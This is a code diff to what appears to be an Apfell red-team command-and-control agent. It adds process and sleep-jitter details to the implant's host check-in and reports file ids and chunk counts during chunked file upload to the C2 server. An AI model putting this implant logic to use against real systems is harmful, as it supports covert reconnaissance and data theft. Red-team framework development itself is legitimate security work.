@@ -367,6 +367,8 @@ class customC2 extends baseC2{
   }
   checkin(ip, pid, user, host, os, architecture, domain){
     let info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid, "os": os, "architecture": architecture, "domain": domain, "action": "checkin"};
+    info["process_name"] = apfell.procInfo.processName.js;
+    info["sleep_info"] = "Sleep interval set to " + C2.interval + " and sleep jitter updated to " + C2.jitter;
     if(user === 'root'){info['integrity_level'] = 3;}
     //let req = null;
     let jsondata = null;
@@ -475,6 +477,10 @@ class customC2 extends baseC2{
         if (registerFile['responses'][0]['status'] === "success"){
             handle.seekToFileOffset(0);
             let currentChunk = 1;
+            this.postResponse(task, {"user_output": JSON.stringify({
+						"agent_file_id": registerFile["file_id"],
+						"total_chunks": numOfChunks
+					})});
             let data = handle.readDataOfLength(chunkSize);
             while(parseInt(data.length) > 0 && offset < fileSize){
                 // send a chunk
